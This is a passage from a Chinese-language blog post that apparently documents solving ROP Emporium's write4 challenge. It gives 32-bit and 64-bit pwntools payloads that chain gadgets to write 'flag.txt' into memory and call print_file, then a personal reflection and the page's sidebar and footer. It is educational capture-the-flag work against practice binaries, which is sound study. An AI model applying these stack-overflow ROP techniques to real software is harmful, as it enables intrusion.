class="line">#写入“.txt”的地址</span><br><span class="line">print_file &#x3D; sys.plt.print_file</span><br><span class="line">#print_file函数的地址</span><br><span class="line">payload &#x3D; b&#39;A&#39;* 40  + b&#39;B&#39; * 4 + p32(gadget_1)  + p32(addr_bss_1) + b&#39;flag&#39; + p32(gadget_2) + p32(gadget_1)  + p32(addr_bss_2) + b&#39;.txt&#39; + p32(gadget_2) + p32(print_file) + p32(0) + p32(addr_bss_1)</span><br></pre></td></tr></table></figure>
+<h4 id="64位-3"><a href="#64位-3" class="headerlink" title="64位"></a>64位</h4><p>64位也是差不多的思路，找一个<code>mov [reg] reg</code>的gadget把字符串写入内存之后调用print_file函数就可以了，而且64位的寄存器是8个字节，可以一次写完<code>flag.txt</code>。</p>
+<p>因为思路差不多，所以直接找gadget，不过64位需要找3个gadget，一个是控制mov相关寄存器的指令，一个是mov指令，还有一个传参的指令。这里发现有两个符合我们需要的gadget，但是edi参数没有合适的gadget控制，所以我们选取第二个。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/write4-5.png"></p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gadget_1 &#x3D; 0x400690</span><br><span class="line">#控制mov寄存器的取值</span><br><span class="line">gadget_2 &#x3D; 0x400628</span><br><span class="line">#mov指令</span><br><span class="line">gadget_3 &#x3D; 0x400693</span><br><span class="line">#pop rdi传参</span><br><span class="line">addr_bss &#x3D; 0x601038</span><br><span class="line">#bss段起始位置</span><br><span class="line">payload &#x3D; b&#39;A&#39;* 32 + b&#39;B&#39;* 8 + p64(gadget_1) + p64(addr_bss) + b&#39;flag.txt&#39; + p64(gadget_2) + p64(gadget_3) + p64(addr_bss) + p64(print_file) </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>做到这也算是十窍通了九窍，继续加油吧。指导我的人说我做不出来题是因为不知道ROP到底是什么。但是在写博客的时候，我发现比这过分多了，不是不知道ROP是什么，而是最基本的对汇编指令的理解都不太到位，虽然我去年看过一次汇编，但是依旧无法融会贯通，比如我不知道eip是用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行；不知道ret 其实是因为将栈顶数据弹出至 eip，所以能控制函数执行，以及解释了为什么能一个gadget接一个gadget的执行，因为每次pop完之后都ret，payload中的下一个地址传给rip。这么一看好像确实也是不懂ROP，但是通过写博客，对很多东西有了更深刻的认知，因为写博客对我来说是一个消化吸收、梳理逻辑、弄清楚之前不懂的点的过程，而且我会想尽量保证博客的准确性，这个时候的我是静下心来去看资料，目标相对也比较明确的。可能博客并没有人会看，但是也是记录自己成长过程的方法，同时还能做一个备忘。</p>
+<p>明年见，886！</p>
+<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a target="_blank" rel="noopener" href="https://aidenpearce369.github.io/binary%20exploitation/2-split/">split两种解法</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/06/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/" rel="prev" title="延迟绑定过程分析">
+      <i class="fa fa-chevron-left"></i> 延迟绑定过程分析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">栈溢出相关知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">相关工具使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#checksec"><span class="nav-number">3.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwntools"><span class="nav-number">3.2.</span> <span class="nav-text">pwntools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROPgadget"><span class="nav-number">3.3.</span> <span class="nav-text">ROPgadget</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwndbg"><span class="nav-number">3.4.</span> <span class="nav-text">pwndbg</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP-Emporium-Writeup"><span class="nav-number">4.</span> <span class="nav-text">ROP Emporium Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="nav-number">4.1.</span> <span class="nav-text">基本解题步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2win"><span class="nav-number">4.2.</span> <span class="nav-text">ret2win</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#32%E4%BD%8D"><span class="nav-number">4.2.1.</span> <span class="nav-text">32位</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#64%E4%BD%8D"><span class="nav-number">4.2.2.</span> <span class="nav-text">64位</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#split"><span class="nav-number">4.3.</span> <span class="nav-text">split</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#32%E4%BD%8D-1"><span class="nav-number">4.3.1.</span> <span class="nav-text">32位</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#64%E4%BD%8D-1"><span class="nav-number">4.3.2.</span> <span class="nav-text">64位</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#callme"><span class="nav-number">4.4.</span> <span class="nav-text">callme</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#32%E4%BD%8D-2"><span class="nav-number">4.4.1.</span> <span class="nav-text">32位</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#64%E4%BD%8D-2"><span class="nav-number">4.4.2.</span> <span class="nav-text">64位</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#write4"><span class="nav-number">4.5.</span> <span class="nav-text">write4</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#32%E4%BD%8D-3"><span class="nav-number">4.5.1.</span> <span class="nav-text">32位</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8D-3"><span class="nav-number">4.6.</span> <span class="nav-text">64位</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">6.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yjy123</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yjy123123" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yjy123123" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:674943053@qq.com" title="E-Mail → mailto:674943053@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yjy123</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'zB1H0PKzDpjxuuiBc2N34Cns-gzGzoHsz',
+      appKey     : 'HBLQQLpG46wIWMhTv8jWvCu9',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
